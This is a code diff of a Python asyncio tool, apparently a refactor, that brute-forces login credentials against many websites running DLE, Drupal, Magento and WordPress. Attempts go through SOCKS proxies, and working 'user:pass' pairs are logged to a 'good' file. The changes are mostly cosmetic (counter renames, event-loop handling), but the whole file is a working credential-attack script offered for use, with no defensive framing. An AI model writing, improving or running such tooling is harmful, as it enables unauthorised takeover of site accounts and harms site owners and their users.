@@ -1,9 +1,6 @@
-# -*- coding: utf-8 -*-
-
 import asyncio
 from json import loads
 from re import match
-from contextlib import redirect_stderr
 from urllib.parse import urlsplit
 
 from aiofiles import open as afile
@@ -18,8 +15,8 @@ from magento import Magento
 from wordpress import WordPress
 
 
-class Devnull(object):
-    def write(self, *_): pass
+GOOD = 0
+FINISHED = 0
 
 
 def macros(p, u, s):
@@ -64,7 +61,7 @@ async def second(s, url, data):
 
 
 async def process(link, user, passw, proxy):
-    global finished, good
+    global GOOD, FINISHED
 
     cproxy = SocksConnector.from_url(f'socks{settings["socks"]}://' + proxy)
 
@@ -89,7 +86,7 @@ async def process(link, user, passw, proxy):
             assert module.required in data[0]
 
             await save('good', f'{link} - {user}:{passw}')
-            good += 1
+            GOOD += 1
     except (SocksConnectionError, SocksError):
         await save('rebrut', f'{link} - {user}:{passw}')
     except asyncio.TimeoutError:
@@ -99,8 +96,8 @@ async def process(link, user, passw, proxy):
     except Exception as e:
         await save('report', e)
     finally:
-        finished += 1
-        print(f'Good: {good}; Done: {finished}', end='\r')
+        FINISHED += 1
+        print(f'Good: {GOOD}; Done: {FINISHED}', end='\r')
         return
 
 
@@ -120,7 +117,7 @@ async def main():
                     async with afile("data/sites.txt", encoding="utf-8",
                                      errors="ignore") as sites:
                         async for site in sites:
-                            task = asyncio.create_task(
+                            task = asyncio.ensure_future(
                                 process(
                                     site.strip(),
                                     user.strip(),
@@ -147,9 +144,6 @@ async def main():
 
 
 if __name__ == "__main__":
-    good = 0
-    finished = 0
-
     modules = {
         '0': DLE(),
         '1': Drupal(),
@@ -173,5 +167,6 @@ if __name__ == "__main__":
         )
     ]
 
-    with redirect_stderr(Devnull()):
-        asyncio.run(main())
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(main())
+    loop.close()
